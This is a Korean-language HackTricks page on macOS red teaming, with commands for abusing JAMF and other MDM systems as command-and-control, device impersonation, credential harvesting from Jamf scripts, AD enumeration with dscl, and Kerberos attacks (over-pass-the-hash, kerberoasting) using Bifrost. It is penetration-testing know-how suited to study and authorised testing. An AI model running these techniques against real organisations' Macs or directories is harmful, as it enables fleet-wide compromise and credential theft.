# macOS Red Teaming

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

#### 해커의 관점에서 웹 앱, 네트워크 및 클라우드를 살펴보세요

**실제 비즈니스에 영향을 미치는 중요한 취약점을 찾아보고 보고하세요.** 20개 이상의 맞춤형 도구를 사용하여 공격 표면을 매핑하고, 권한 상승을 허용하는 보안 문제를 찾아내며, 자동화된 익스플로잇을 사용하여 필수 증거를 수집하여 귀하의 노력을 설득력 있는 보고서로 전환하세요.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## MDM 악용하기

* JAMF Pro: `jamf checkJSSConnection`
* Kandji

관리 플랫폼에 접근하기 위해 **관리자 자격 증명을 탈취**하는 데 성공하면, 기계에 악성 코드를 배포하여 **모든 컴퓨터를 잠재적으로 손상시킬 수 있습니다.**

MacOS 환경에서 레드 팀 활동을 수행하려면 MDM이 어떻게 작동하는지에 대한 이해가 필요합니다:

{% content-ref url="macos-mdm/" %}
[macos-mdm](macos-mdm/)
{% endcontent-ref %}

### C2로서 MDM 사용하기

MDM은 프로필을 설치, 쿼리 또는 제거하고, 애플리케이션을 설치하고, 로컬 관리자 계정을 생성하고, 펌웨어 비밀번호를 설정하고, FileVault 키를 변경할 수 있는 권한을 가집니다...

자신의 MDM을 운영하려면 **공급업체에 의해 서명된 CSR**이 필요하며, 이를 [**https://mdmcert.download/**](https://mdmcert.download/)에서 얻으려고 시도할 수 있습니다. Apple 장치용 MDM을 운영하려면 [**MicroMDM**](https://github.com/micromdm/micromdm)을 사용할 수 있습니다.

그러나 등록된 장치에 애플리케이션을 설치하려면 여전히 개발자 계정으로 서명되어야 합니다... 그러나 MDM 등록 시 **장치가 MDM의 SSL 인증서를 신뢰할 수 있는 CA로 추가**하므로 이제 무엇이든 서명할 수 있습니다.

장치를 MDM에 등록하려면 **`mobileconfig`** 파일을 루트로 설치해야 하며, 이는 **pkg** 파일을 통해 전달될 수 있습니다(압축하여 zip으로 만들고 Safari에서 다운로드하면 압축이 해제됩니다).

**Mythic agent Orthrus**는 이 기술을 사용합니다.

### JAMF PRO 악용하기

JAMF는 **사용자 정의 스크립트**(시스템 관리자가 개발한 스크립트), **네이티브 페이로드**(로컬 계정 생성, EFI 비밀번호 설정, 파일/프로세스 모니터링...) 및 **MDM**(장치 구성, 장치 인증서...)를 실행할 수 있습니다.

#### JAMF 자체 등록

`https://<회사 이름>.jamfcloud.com/enroll/`와 같은 페이지로 이동하여 **자체 등록이 활성화되어 있는지** 확인하세요. 활성화되어 있다면 **접근을 위한 자격 증명을 요청할 수 있습니다.**

[**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) 스크립트를 사용하여 비밀번호 스프레이 공격을 수행할 수 있습니다.

또한, 적절한 자격 증명을 찾은 후에는 다음 양식을 사용하여 다른 사용자 이름을 무차별 대입할 수 있습니다:

![](<../../.gitbook/assets/image (107).png>)

#### JAMF 장치 인증

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** 바이너리는 키체인을 여는 비밀을 포함하고 있으며, 발견 당시 모든 사람과 **공유**되었습니다: **`jk23ucnq91jfu9aj`**.\
또한, jamf는 **`/Library/LaunchAgents/com.jamf.management.agent.plist`**에 **LaunchDaemon**으로 **지속**됩니다.

#### JAMF 장치 인수

**JSS** (Jamf Software Server) **URL**은 **`jamf`**가 사용할 **`/Library/Preferences/com.jamfsoftware.jamf.plist`**에 위치합니다.\
이 파일은 기본적으로 URL을 포함합니다:

{% code overflow="wrap" %}
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
{% endcode %}

그래서 공격자는 설치할 때 이 파일을 **덮어쓰는** 악성 패키지(`pkg`)를 배포할 수 있으며, 이제 **Typhon 에이전트의 Mythic C2 리스너에 대한 URL**을 설정하여 JAMF를 C2로 악용할 수 있습니다.

{% code overflow="wrap" %}
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
{% endcode %}

#### JAMF 사칭

장치와 JMF 간의 **통신을 사칭**하기 위해 필요한 것은:

* 장치의 **UUID**: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
* 장치 인증서를 포함하는 **JAMF 키체인**: `/Library/Application\ Support/Jamf/JAMF.keychain`

이 정보를 가지고, **도난당한** 하드웨어 **UUID**와 **SIP 비활성화**된 **VM**을 생성하고, **JAMF 키체인**을 드롭한 후, Jamf **에이전트**를 **후킹**하여 정보를 훔쳐야 합니다.

#### 비밀 훔치기

<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

관리자가 Jamf를 통해 실행하고자 할 **사용자 정의 스크립트**를 위해 `/Library/Application Support/Jamf/tmp/` 위치를 모니터링할 수도 있습니다. 이 스크립트는 **여기에 배치되고 실행된 후 제거됩니다.** 이 스크립트는 **자격 증명**을 포함할 수 있습니다.

그러나 **자격 증명**은 이러한 스크립트에 **매개변수**로 전달될 수 있으므로, `ps aux | grep -i jamf`를 모니터링해야 합니다 (루트 권한 없이도 가능합니다).

스크립트 [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py)는 새 파일이 추가되거나 새 프로세스 인수가 생기는 것을 감지할 수 있습니다.

### macOS 원격 액세스

또한 **MacOS**의 "특별한" **네트워크** **프로토콜**에 대해:

{% content-ref url="../macos-security-and-privilege-escalation/macos-protocols.md" %}
[macos-protocols.md](../macos-security-and-privilege-escalation/macos-protocols.md)
{% endcontent-ref %}

## Active Directory

어떤 경우에는 **MacOS 컴퓨터가 AD에 연결되어 있는** 것을 발견할 수 있습니다. 이 시나리오에서는 익숙한 대로 **액티브 디렉토리**를 **열거**하려고 시도해야 합니다. 다음 페이지에서 **도움**을 찾으세요:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/active-directory-methodology/" %}
[active-directory-methodology](../../windows-hardening/active-directory-methodology/)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-kerberos-88/" %}
[pentesting-kerberos-88](../../network-services-pentesting/pentesting-kerberos-88/)
{% endcontent-ref %}

도움이 될 수 있는 **로컬 MacOS 도구**는 `dscl`입니다:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
또한 MacOS에서 AD를 자동으로 열거하고 kerberos와 상호작용하기 위해 준비된 몇 가지 도구가 있습니다:

* [**Machound**](https://github.com/XMCyber/MacHound): MacHound는 MacOS 호스트에서 Active Directory 관계를 수집하고 수집할 수 있도록 하는 Bloodhound 감사 도구의 확장입니다.
* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost는 macOS에서 Heimdal krb5 API와 상호작용하도록 설계된 Objective-C 프로젝트입니다. 이 프로젝트의 목표는 타겟에 다른 프레임워크나 패키지를 요구하지 않고 네이티브 API를 사용하여 macOS 장치에서 Kerberos에 대한 보안 테스트를 개선하는 것입니다.
* [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directory 열거를 수행하기 위한 JavaScript for Automation (JXA) 도구입니다.

### 도메인 정보
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Users

MacOS 사용자 유형은 세 가지입니다:

* **로컬 사용자** — 로컬 OpenDirectory 서비스에 의해 관리되며, Active Directory와는 연결되어 있지 않습니다.
* **네트워크 사용자** — DC 서버에 연결하여 인증이 필요한 변동성 Active Directory 사용자입니다.
* **모바일 사용자** — 자격 증명 및 파일에 대한 로컬 백업이 있는 Active Directory 사용자입니다.

사용자 및 그룹에 대한 로컬 정보는 _/var/db/dslocal/nodes/Default._ 폴더에 저장됩니다.\
예를 들어, _mark_라는 사용자에 대한 정보는 _/var/db/dslocal/nodes/Default/users/mark.plist_에 저장되며, _admin_ 그룹에 대한 정보는 _/var/db/dslocal/nodes/Default/groups/admin.plist_에 있습니다.

HasSession 및 AdminTo 엣지를 사용하는 것 외에도, **MacHound는 Bloodhound 데이터베이스에 세 가지 새로운 엣지를 추가합니다**:

* **CanSSH** - 호스트에 SSH할 수 있는 엔티티
* **CanVNC** - 호스트에 VNC할 수 있는 엔티티
* **CanAE** - 호스트에서 AppleEvent 스크립트를 실행할 수 있는 엔티티
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
더 많은 정보는 [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ 비밀번호

다음 방법으로 비밀번호를 가져옵니다:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
**`Computer$`** 비밀번호에 접근하는 것은 시스템 키체인 내에서 가능합니다.

### Over-Pass-The-Hash

특정 사용자 및 서비스에 대한 TGT를 가져옵니다:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
TGT가 수집되면, 현재 세션에 주입할 수 있습니다:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
획득한 서비스 티켓을 사용하여 다른 컴퓨터의 공유에 접근할 수 있습니다:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## 키체인 접근

키체인은 아마도 민감한 정보를 포함하고 있으며, 프롬프트를 생성하지 않고 접근할 경우 레드 팀 연습을 진행하는 데 도움이 될 수 있습니다:

{% content-ref url="macos-keychain.md" %}
[macos-keychain.md](macos-keychain.md)
{% endcontent-ref %}

## 외부 서비스

MacOS 레드 팀은 일반적인 Windows 레드 팀과 다릅니다. 일반적으로 **MacOS는 여러 외부 플랫폼과 직접 통합되어 있습니다**. MacOS의 일반적인 구성은 **OneLogin 동기화 자격 증명을 사용하여 컴퓨터에 접근하고, OneLogin을 통해 여러 외부 서비스**(예: github, aws...)에 접근하는 것입니다.

## 기타 레드 팀 기술

### Safari

Safari에서 파일이 다운로드될 때, "안전한" 파일이라면 **자동으로 열립니다**. 예를 들어, **zip 파일을 다운로드하면** 자동으로 압축이 해제됩니다:

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

## 참고 문헌

* [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
* [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
* [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
* [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
* [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

#### 해커의 관점에서 웹 앱, 네트워크 및 클라우드 보기

**실제 비즈니스에 영향을 미치는 중요한 취약점을 찾아보고 보고하세요.** 20개 이상의 맞춤형 도구를 사용하여 공격 표면을 매핑하고, 권한 상승을 허용하는 보안 문제를 찾아내며, 자동화된 익스플로잇을 사용하여 필수 증거를 수집하여 귀하의 노력을 설득력 있는 보고서로 전환하세요.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나, **Twitter**에서 **팔로우**하세요** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
